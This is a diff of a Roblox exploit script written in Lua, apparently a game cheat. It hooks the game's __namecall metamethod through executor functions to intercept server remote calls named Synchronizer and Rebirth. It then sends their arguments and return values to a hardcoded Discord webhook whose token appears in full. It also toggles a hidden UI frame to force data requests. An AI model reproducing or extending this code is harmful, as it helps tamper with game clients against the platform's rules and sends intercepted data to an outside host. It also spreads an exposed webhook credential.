@@ -1,4 +1,4 @@
--- stat_sniffer.lua
+-- deep_probe.lua
 local WEBHOOK = "https://discord.com/api/webhooks/1573296342854410384/3Nfz9qxVONkZl1jZADGMzCN6buVXkKydQgc8vNwIHjwhDvYsffo4BWcoe3UU1fI86CNf"
 local http = request or http_request or (syn and syn.request)
 local HttpService = game:GetService("HttpService")
@@ -7,31 +7,48 @@ local function post(c)
     pcall(function()
         http({ Url = WEBHOOK, Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode({ content = c:sub(1, 1900) }) })
+            Body = HttpService:JSONEncode({ content = tostring(c):sub(1, 1900) }) })
     end)
 end
 
-post("SNIFFER STARTED. Waiting for server data...")
+post("DEEP PROBE STARTED. Hooking Invokes...")
 
 local Net = game:GetService("ReplicatedStorage").Packages.Net
-local Comm = Net:FindFirstChild("RE/Synchronizer/CommunicationRoute")
 
-if not Comm then
-    post("ERROR: Could not find CommunicationRoute")
-    return
-end
-
-local captured = 0
-Comm.OnClientEvent:Connect(function(...)
-    if captured >= 3 then return end -- only capture the first 3 updates so Discord isn't spammed
-    captured = captured + 1
+-- 1. Hook the namecall to catch the arguments and return values of the Synchronizer
+local oldNamecall
+oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+    local method = getnamecallmethod()
     
-    local args = {...}
-    local parts = {}
-    for i, v in ipairs(args) do
-        local ok, enc = pcall(function() return HttpService:JSONEncode(v) end)
-        parts[i] = ok and enc or tostring(v)
+    if (method == "InvokeServer") and self.Parent == Net then
+        local name = self.Name
+        if name:find("Synchronizer") or name:find("Rebirth") then
+            local args = {...}
+            local ret = oldNamecall(self, ...)
+            
+            local ok, enc = pcall(function() return HttpService:JSONEncode(ret) end)
+            local argsStr = ""
+            for i, v in ipairs(args) do argsStr = argsStr .. "[" .. tostring(v) .. "] " end
+            
+            post("INVOKE: " .. name .. "\nARGS: " .. argsStr .. "\nRETURN: " .. (ok and enc or tostring(ret)))
+            return ret
+        end
     end
     
-    post("STAT UPDATE " .. captured .. ":\n" .. table.concat(parts, " | "))
+    return oldNamecall(self, ...)
+end)
+
+-- 2. Trigger a sync by opening the Rebirth UI programmatically
+task.spawn(function()
+    task.wait(2)
+    local rebirthGui = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Index")
+    if rebirthGui then
+        post("Found Index UI. Toggling to force a data request.")
+        -- Simulating a click on the UI to force it to ask the server for stats
+        if rebirthGui:FindFirstChild("Index") then
+            rebirthGui.Index.Visible = true
+        end
+    else
+        post("Could not find Index UI automatically. Please open the Rebirth menu manually.")
+    end
 end)
